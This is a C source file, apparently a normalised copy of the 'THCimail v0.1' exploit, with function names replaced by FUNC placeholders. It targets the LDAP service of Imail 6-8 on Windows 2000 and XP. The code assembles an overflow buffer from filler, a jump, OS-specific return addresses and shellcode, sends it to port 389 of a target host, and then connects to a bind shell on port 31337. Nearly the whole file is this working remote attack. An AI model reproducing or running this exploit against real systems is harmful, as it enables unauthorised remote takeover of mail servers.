#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {unsigned int s_addr; } ;
struct sockaddr_in {void* sin_port; int /*<<< orphan*/  sin_family; TYPE_1__ sin_addr; } ;
struct sockaddr {int dummy; } ;
struct hostent {int /*<<< orphan*/  h_addrtype; int /*<<< orphan*/  h_length; int /*<<< orphan*/  h_addr; } ;
typedef  int /*<<< orphan*/  mytcp ;
typedef  int /*<<< orphan*/  WSADATA ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 unsigned int INADDR_NONE ; 
 int /*<<< orphan*/  IPPROTO_TCP ; 
 int /*<<< orphan*/  FUNC0 (int,int) ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 unsigned char* WIN2KPG ; 
 unsigned char* WINXPSP1G ; 
 scalar_t__ FUNC2 (int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 scalar_t__ FUNC3 (char*) ; 
 int /*<<< orphan*/  FUNC4 (unsigned int) ; 
 unsigned int FUNC5 (unsigned int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  FUNC6 (int) ; 
 int /*<<< orphan*/  FUNC7 (unsigned char*) ; 
 struct hostent* FUNC8 (char*) ; 
 void* FUNC9 (int) ; 
 unsigned int FUNC10 (char*) ; 
 unsigned char* jumper ; 
 unsigned char* ldapshit ; 
 unsigned char* FUNC11 (int) ; 
 int /*<<< orphan*/  FUNC12 (TYPE_1__*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC13 (unsigned char*,char,int) ; 
 int /*<<< orphan*/  FUNC14 (char*,...) ; 
 int /*<<< orphan*/  FUNC15 (unsigned int,unsigned char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC16 (unsigned int) ; 
 unsigned char* shellcode ; 
 int /*<<< orphan*/  FUNC17 (unsigned int,int) ; 
 unsigned int FUNC18 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC19 (unsigned char*,unsigned char*) ; 
 int /*<<< orphan*/  FUNC20 () ; 

int FUNC21(int argc, char *argv[])
{ 
unsigned int i,sock,sock2,addr,os,ver,rc,IMAILVER;
unsigned char *finalbuffer,*crapbuf1,*crapbuf2;
unsigned int IMAIL6_7=60;
unsigned int IMAIL_8=68;

struct sockaddr_in mytcp;
struct hostent * hp;
WSADATA wsaData;

FUNC14("\nTHCimail v0.1 - Imail LDAP exploit\n");
FUNC14("tested on Imail 6-8\n");
FUNC14("by Johnny Cyberpunk (jcyberpunk@thc.org)\n");

if(argc<4 || argc>4)
FUNC20();

ver = (unsigned short)FUNC3(argv[3]); 
switch(ver)
{
case 0:
IMAILVER = IMAIL6_7;
break;
case 1:
IMAILVER = IMAIL_8;
break;
default:
FUNC14("\nYou entered an illegal version !\n\n");
FUNC20();
FUNC6(-1);
}

crapbuf1 = FUNC11(IMAILVER);
FUNC13(crapbuf1,'X',IMAILVER);

FUNC14("imailver = %d\n",IMAILVER);

crapbuf2 = FUNC11(2220);
FUNC13(crapbuf2,'X',2220);

finalbuffer = FUNC11(2650);
FUNC13(finalbuffer,0,2650);

FUNC14("\n[*] building buffer\n");

FUNC19(finalbuffer,ldapshit);

FUNC19(finalbuffer,crapbuf1);

FUNC19(finalbuffer,jumper);

os = (unsigned short)FUNC3(argv[2]); 
switch(os)
{
case 0:
FUNC19(finalbuffer,WIN2KPG);
break;
case 1:
FUNC19(finalbuffer,WIN2KPG);
break;
case 2:
FUNC19(finalbuffer,WINXPSP1G);
break;
default:
FUNC14("\nYou entered an illegal OS !\n\n");
FUNC20();
FUNC6(-1);
}

FUNC19(finalbuffer,shellcode);
FUNC19(finalbuffer,crapbuf2);

if (FUNC2(FUNC0(2,1),&wsaData) != 0)
{
FUNC14("WSAStartup failed !\n");
FUNC6(-1);
}

hp = FUNC8(argv[1]);

if (!hp){
addr = FUNC10(argv[1]);
}
if ((!hp) && (addr == INADDR_NONE) )
{
FUNC14("Unable to resolve %s\n",argv[1]);
FUNC6(-1);
}

sock=FUNC18(AF_INET,SOCK_STREAM,IPPROTO_TCP);
if (!sock)
{ 
FUNC14("socket() error...\n");
FUNC6(-1);
}

if (hp != NULL)
FUNC12(&(mytcp.sin_addr),hp->h_addr,hp->h_length);
else
mytcp.sin_addr.s_addr = addr;

if (hp)
mytcp.sin_family = hp->h_addrtype;
else
mytcp.sin_family = AF_INET;

mytcp.sin_port=FUNC9(389);

FUNC14("[*] connecting the target\n");

rc=FUNC5(sock, (struct sockaddr *) &mytcp, sizeof (struct sockaddr_in));
if(rc==0)
{
FUNC15(sock,finalbuffer,2650,0);
FUNC14("[*] Exploit send successfully ! Sleeping a while ....\n");
FUNC1(1000);
}
else
FUNC14("\nCan't connect to ldap port!\n");

if(rc==0)
{
FUNC14("[*] Trying to get a shell\n\n");
sock2 = FUNC18(AF_INET,SOCK_STREAM,IPPROTO_TCP);
mytcp.sin_port = FUNC9(31337);
rc = FUNC5(sock2, (struct sockaddr *)&mytcp, sizeof(mytcp));
if(rc!=0)
{
FUNC14("can't connect to port 31337 ;( maybe firewalled ...\n");
FUNC6(-1);
}
FUNC16(sock2);
}

FUNC17(sock,1);
FUNC4(sock);

FUNC7(crapbuf1);
FUNC7(crapbuf2);
FUNC7(finalbuffer); 

FUNC6(0);
}